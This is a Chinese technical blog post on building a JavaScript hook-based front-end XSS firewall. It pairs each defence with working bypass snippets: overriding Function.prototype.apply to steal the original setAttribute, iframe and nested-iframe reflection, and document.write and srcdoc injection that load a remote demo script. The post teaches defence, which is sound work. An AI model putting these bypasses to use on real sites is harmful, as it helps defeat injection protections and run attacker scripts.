---
layout: post
title: XSS 前端防火墙 —— 无懈可击的钩子
author: zjcqoo
---

昨天尝试了一系列的[可疑模块拦截](http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-2/)试验，尽管最终的方案还存在着一些兼容性问题，但大体思路已经明确了：

* 静态模块：使用 MutationObserver 扫描。
* 动态模块：通过 API 钩子来拦截路径属性。

提到钩子程序，大家会联想到传统应用程序里的 API Hook，以及各种外挂木马。当然，未必是系统函数，任何 CPU 指令都能被改写成跳转指令，以实现先运行自己的程序。

无论是在哪个层面，钩子程序的核心理念都是一样的：无需修改已有的程序，即可先执行我们的程序。

这是一种链式调用的模式。调用者无需关心上一级的细节，直管用就是了，即使有额外的操作对其也是不可见的。从最底层的指令拦截，到语言层面的虚函数继承，以及更高层次的面向切面，都带有这类思想。

对于 JavaScript 这样灵活的语言，任何模式都可以实现。之前做过一个[网页版的变速齿轮](http://www.cnblogs.com/index-html/archive/2012/05/29/jsgear.html)，用的就是这类原理。


## JavaScript 钩子小试

要实现一个最基本的钩子程序非常简单，昨天已演示过了。现在我们再来给 setAttribute 接口实现一个钩子：

```js
// 保存上级接口
var raw_fn = Element.prototype.setAttribute;

// 勾住当前接口
Element.prototype.setAttribute = function(name, value) {

	// 额外细节实现
	if (this.tagName == 'SCRIPT' && /^src$/i.test(name)) {
		if (/xss/.test(value)) {
			if (confirm('试图加载可疑模块：\n\n' + url + '\n\n是否拦截？')) {
				return;
			}
		}
	}
	raw_fn.apply(this, arguments);
};

// 创建脚本
var el = document.createElement('script');
el.setAttribute('SRC', 'http://www.etherdream.com/xss/alert.js');
document.body.appendChild(el);
```
[Run](http://jsfiddle.net/zjcqoo/nMUrx/)


类似昨天的访问器拦截，现在我们对 setAttribute 也进行类似的监控。因为它是个函数，所有主流浏览器都兼容。


## 钩子泄露

看起来似乎毫无难度，而且也没什么不对的地方，这不就可以了吗？

如果最终就用这代码，那也太挫了。我们把原始接口都暴露在全局变量里了，攻击者只要拿了这个变量，即可绕过我们的检测代码：

```js
var el = document.createElement('script');

// 直接调用原始接口
raw_fn.call(el, 'SRC', 'http://www.etherdream.com/xss/alert.js');
document.body.appendChild(el);
```
[Run](http://jsfiddle.net/zjcqoo/pq6y9/)


靠，这不算，这只是我们测试而已。现实中谁会放在全局变量里呢，这年头不套一个闭包的脚本都不好意思拿出来。

好吧，我还是放闭包里，这总安全了吧。看你怎么隔空取物，从我闭包里偷出来。

```js
(function() {
	// 保存上级接口
	var raw_fn = Element.prototype.setAttribute;
	...
})();
```

不过，真要偷出来，那绝对是没问题的！

这个变量唯一用到的地方就是：

```js
raw_fn.apply(this, arguments)
```

这可不是一个原子操作，而是调用了 Function.prototype.apply 这个全局函数。神马。。。这。是真的，不信你可以试试！

不用说，你也懂了。我还是说完吧：我们可以重写 apply，然后随便给某个元素 setAttribute 下，就可以窃听到钩子传过来的 raw_fn 了。

```js
Function.prototype.apply = function() {
	console.log('哈哈，得到原始接口了:', this);
};
document.body.setAttribute('a', 1);
```
[Run](http://jsfiddle.net/zjcqoo/P55dj/)

<div class="post-img"><img src="/img/xss-frontend-firewall-3/func_leak.png" style="max-width:840px;" /></div>

这也太贱了吧，不带这样玩的。可人家就能用这招绕过你，又怎样。

你会想，干脆把 Function.prototype.apply 也提前保存起来得了。然后一番折腾，你会发现代码变成 apply.apply.apply.apply...

毕竟，apply 和 call 已是最底层了，没法再 call 自己了。

这可怎么办。显然不能再用 apply 或 call 了，但不用它们没法把 this 变量传进去啊。回想下，有哪些方法可以控制 this 的：

* obj.method()

* method.call(obj)

貌似也就这两类。排除了第二种，那只剩最古老的用法了。可是我们已经重写了现有的接口，再调用自己那就递归溢出了。

但是，我们可以给原始接口换个名字，不就可以避免冲突了：

```js
(function() {
	// 保存上级接口
	Element.prototype.__setAttribute = Element.prototype.setAttribute;

	// 勾住当前接口
	Element.prototype.setAttribute = function(name, value) {
		// 额外细节实现 ...

		// 向上调用
		this.__setAttribute(name, value);
	};
})();
```
[Run](http://jsfiddle.net/zjcqoo/s5QLK/)

这样倒是甩掉 apply 这个包袱了，但是无论取『__setAttribute』，还是换成其他名字，人家知道了，照样可以拿出原始接口。所以，我们得取个复杂的名字，最好每次还都不一样：

```js
(function() {
	// 取个霸气的名字
	var token = '$' + Math.random();

	// 保存上级接口
	Element.prototype[token] = Element.prototype.setAttribute;

	// 勾住当前接口
	Element.prototype.setAttribute = function(name, value) {
		// 额外细节实现 ...

		// 向上调用
		this[token](name, value);
	};
})();
```
[Run](http://jsfiddle.net/zjcqoo/q59jq/)


现在，你完全不知道我把原始接口藏在哪了，而且用 ``this[token](...)`` 这个巧妙的方法，同样符合刚才列举的第一类用法。

问题似乎。。。解决了。但，总感觉有什么不对劲。。。人家不知道变量藏哪了，难道不可以找吗。把 Element.prototype 遍历下，一个个找过去，不相信会找不到：

```js
for(var k in Element.prototype) {
    console.log(k);
    
    if (k.substr(0,1) == '$') {
        console.error('楼上的，你这名字那么猥琐，敢露个面吗');
        console.error(Element.prototype[k]);
    }
}
```
[Run](http://jsfiddle.net/zjcqoo/Vc8pn/)

<div class="post-img"><img src="/img/xss-frontend-firewall-3/find_raw.png" style="max-width:840px;" /></div>

取了个这么拉风的名字，就象是黑暗中的萤火虫，瞬间给揪出来了。你会说，为什么不取个再隐蔽点的名字，甚至还可以冒充良民，把从来不用的方法给替换了。

不过，无论想怎么躲，都是徒劳的。有无数种方法可以让你原形毕露。除非 —— 根本不能被人家枚举到。


## 属性隐身术

如果没记错的话，主流 JavaScript 里好像还真有什么叫 enumerable、configurable 之类的东西。把它们搬出来，看看能不能赋予我们隐身功能？

马上就试试：

```js
// 嘘~ 劳资要隐身了
Object.defineProperty(Element.prototype, token, {
	value: Element.prototype.setAttribute,
	enumerable: false
});
```
[Run](http://jsfiddle.net/zjcqoo/Vc8pn/)


神奇，红红的那坨字果然没出现。看来真的隐身了！

到此，原函数泄露的问题，我们算是搞定了。

不过暂时还不能松懈，为什么？连 apply 都能被山寨，那还有什么可以相信的！那些正则表达式的 test 方法、字符串的大小写转换、数组的 forEach 等等等等，都是可以被改写的。

要是人家把 RegExp.prototype.test 重写了，并且总是返回 false，那么我们的策略判断就完全失效了。

所以，我们得重复上面的步骤，把这些运行时要用到的全局方法，都得随机隐匿起来。


## 锁死 call 和 apply

不过，隐藏一个还好，大量的代码都用这种 Geek 的方式，显得很是累赘。

既然能有隐身那样神奇的魔法，难道就没有其他类似的吗？事实上，Object.defineProperty 里还有很多有意思的功能，除了让属性不可见，还能不可写、不可删等等。

可以让属性不可写？太好了，不如干脆把 Function.prototype.call 和 apply 都事先锁死吧，反正谁会无聊到重写它们呢。

```js
Object.defineProperty(Function.prototype, 'call', {
	value: Function.prototype.call,
	writable: false,
	configurable: false,
	enumerable: true
});

// apply 也一样
```

马上看看效果：

```js
Function.prototype.call = function() {
	alert('hello');
};
console.log(Function.prototype.call);
```

果然还是

```js
function call() { [native code] }
```
[Run](http://jsfiddle.net/zjcqoo/YFBVn/)


现在，我们大可放心的使用 call 和 apply，再也不用鼓捣那堆随机属性了。

不过这种随机+隐藏的属性，今后还是有用武之地的，常常用来给公开的对象做个秘密的记号，所以没有白折腾。

到此，我们终于可以松口气了。


## 新页面反射

别高兴的太早，真正的难题还在后面呢。

既然人家想破解，是会用尽各种手段的，并不局限于纯脚本。因为这是在网页里，攻击者们还可以呼唤出各种变幻莫测的浏览器功能，来躲避我们。

最简单的，就是创建一个框架页面，然后通过 contentWindow 即可获得一个全新的环境：

```js
// 反射出纯净的接口
var frm = document.createElement('iframe');
document.body.appendChild(frm);
var raw_fn = frm.contentWindow.Element.prototype.setAttribute;

// 创建脚本
var el = document.createElement('script');
raw_fn.call(el, 'SRC', 'http://www.etherdream.com/xss/alert.js');
document.body.appendChild(el);
```
[Run](http://jsfiddle.net/zjcqoo/886ub/)


这时，我们的钩子程序就被瞬间秒杀了。

尽管同源页面之间是可以相互访问，但其所在的环境却是隔离的。子页面所有的一切都是独立的副本，完全不受主页面影响。

不过，既然能够访问子页面，显然也能给它们的环境安装上钩子。每当有新的框架元素出现时，我们就立即对其注入防护程序，让用户获取到的 contentWindow 已是带有钩子的。

类似传统的应用程序，每当调用其他程序时，安全软件需将新创建的进程加以防护。

你说会这很容易办到。将 createElement 方法勾住，然后在里面判断创建的是不是框架元素，如果是的话就直接防护子页面，不就可以了吗？

显然，这是经不起实践的。事实上，只要测试下你就会发现，未挂载到主节点的框架元素，contentWindow 始终是 null。也就是说，必须在调用 appendChild 之后才开始初始化子页面。

因此，我们得借助之前研究的节点挂载事件，找到一个能在 appendChild 之后，但在用户获取 contentWindow 之前触发的事件。

```js
var observer = new MutationObserver(function(mutations) {
	console.log('MutationObserver:', mutations);
});
observer.observe(document, {
	subtree: true,
	childList: true
});

document.addEventListener('DOMNodeInserted', function(e) {
	console.log('DOMNodeInserted:', e);
}, true);


// 反射出纯净的接口
var frm = document.createElement('iframe');

console.warn('begin');
document.body.appendChild(frm);
console.warn('end');

var raw_fn = frm.contentWindow.Element.prototype.setAttribute;

/** 输出
begin
DOMNodeInserted  MutationEvent
end
MutationObserver:  Array[1]
MutationObserver:  Array[1]
*/
```
[Run](http://jsfiddle.net/zjcqoo/Lm2su/)

这不，DOMNodeInserted 就能满足我们的需求。于是，我们使用它来监控框架元素。

一旦发现有框架挂载到主节点上，我们赶紧把它的接口也装上钩子：

```js
// 我们防御系统
(function() {
	function installHook(window) {
		// 保存上级接口
		var raw_fn = window.Element.prototype.setAttribute;

		// 勾住当前接口
		window.Element.prototype.setAttribute = function(name, value) {
			// 试试
			alert(name);

			// 向上调用
			raw_fn.apply(this, arguments);
		};
	}
	// 先保护当前页面
	installHook(window);

	document.addEventListener('DOMNodeInserted', function(e) {
		var element = e.target;

		// 给框架里环境也装个钩子
		if (element.tagName == 'IFRAME') {
			installHook(element.contentWindow);
		}
	}, true);
})();


// 反射出纯净的接口
var frm = document.createElement('iframe');
document.body.appendChild(frm);
var raw_fn = frm.contentWindow.Element.prototype.setAttribute;

// 创建脚本
var el = document.createElement('script');
raw_fn.call(el, 'SRC', 'http://www.etherdream.com/xss/alert.js');
document.body.appendChild(el);
```
[Run](http://jsfiddle.net/zjcqoo/LHznC/)


完美！对话框成功弹出来了！即使从框架页里反射出新环境，仍然带有我们的钩子程序。

不过，貌似还漏了些什么。要是从框架页里再套框架页，我们就杯具了：

```js
// 创建框架页
var frm = document.createElement('iframe');
document.body.appendChild(frm);

// 创建框架页的框架页
var doc = frm.contentDocument;
var frm2 = doc.createElement('iframe');
doc.body.appendChild(frm2);

// 反射接口
var raw_fn = frm2.contentWindow.Element.prototype.setAttribute;

// 创建脚本
var el = document.createElement('script');
raw_fn.call(el, 'SRC', 'http://www.etherdream.com/xss/alert.js');
document.body.appendChild(el);
```
[Run](http://jsfiddle.net/zjcqoo/MGBVP/)

<div class="post-img"><img src="/img/xss-frontend-firewall-3/frame_nest.png" style="max-width:840px;" /></div>

前面说了，每个页面环境是独立的，主页面是捕捉不到子页面里的事件的。所以，框架页里创建元素，我们完全不知道。

怎么破？这还不简单，索性给框架页也绑上 DOMNodeInserted 事件，不就可以层层监控了吗。无论框架的几次方，都逃不过我们的火眼金睛了。

```js
// 我们防御系统
(function() {
	function installHook(window) {
		// 保存上级接口
		var raw_fn = window.Element.prototype.setAttribute;

		// 勾住当前接口
		window.Element.prototype.setAttribute = function(name, value) {
			// 试试
			alert(name);

			// 向上调用
			raw_fn.apply(this, arguments);
		};

		// 监控当前环境的元素
		window.document.addEventListener('DOMNodeInserted', function(e) {
			var element = e.target;

			// 给框架里环境也装个钩子
			if (element.tagName == 'IFRAME') {
				installHook(element.contentWindow);
			}
		}, true);
	}

	// 先保护当前页面
	installHook(window);
})();
```
[Run](http://jsfiddle.net/zjcqoo/FbZdv/)

只需简单的小改动。我们把 DOMNodeInserted 放到 installHook 里，这样在安装钩子的同时，也对当前 window 中的元素进行监控。一旦出现框架元素，就递归防护。

现在，我们的框架页监控已是天衣无缝了。


## 新页面逆向控制

不过，世上没有绝对的事。

我们只考虑了正向的反射，却忘了框架也可以逆向控制主页面。攻击者要是能把 XSS 脚本注入到框架页里，同样也可以向上修改主页面里的内容，发起信任攻击。

在框架里引入脚本，方法就更多了。框架元素虽然是动态创建的，但其内容可以静态呈现：

```js
// 创建框架页
var frm = document.createElement('iframe');
document.body.appendChild(frm);

// 静态呈现
frm.contentDocument.write('<\script src=http://www.etherdream.com/xss/alert.js><\/script>');
```
[Run](http://jsfiddle.net/zjcqoo/3bRkL/)


这只是随便列举了一种。事实上，HTML5 还新增一个可以直接控制框架页内容的属性：srcdoc。

```html
<iframe srcdoc="<script src=http://www.etherdream.com/xss/alert.js></script>"></iframe>
```
[Run](http://jsfiddle.net/zjcqoo/PH94h/)

并且还是在同源环境中执行的：

```html
<iframe srcdoc="<script>parent.alert('call from frame')</script>"></iframe>
```
[Run](http://jsfiddle.net/zjcqoo/jXEgL/)


搞了半天结果还是能被绕过。

不过别灰心，经测试，document.write 出来的内容是可以被 MutationObserver 捕获到的。至于 srcdoc 嘛，这个偏门的属性完全可以把它禁掉，或者重写访问器，把 HTML 内容用其他办法代理到页面上去。反正这又不是主流的用法，只要最终效果一样就没问题了。

当然，要是在主页面里 document.write 怎么办？脚本确实能运行，但不白屏了吗。如果觉得这有风险，可以在 DOMContentLoaded 之后，把 document.write 也屏蔽掉，以免后患。


## 后记

虽说魔高一尺道高一丈，但再牢固的钩子还是有意想不到的办法绕过的。因此我们得与时俱进，不断修缮来强化防御能力。

到目前为止，我们已对脚本、框架、API 接口实现了主动防御。但是，具备执行能力的元素并不止这些。

例如 Flash 就可以运行页面中的脚本，光是它就占用了 object，embed，param 那么多元素。

而且，API 防护钩子并不全面，只是例举了几个常用的。

[下一篇](http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-4)，我们将详细的整理需要防护的监控点，实现全方位的防护。


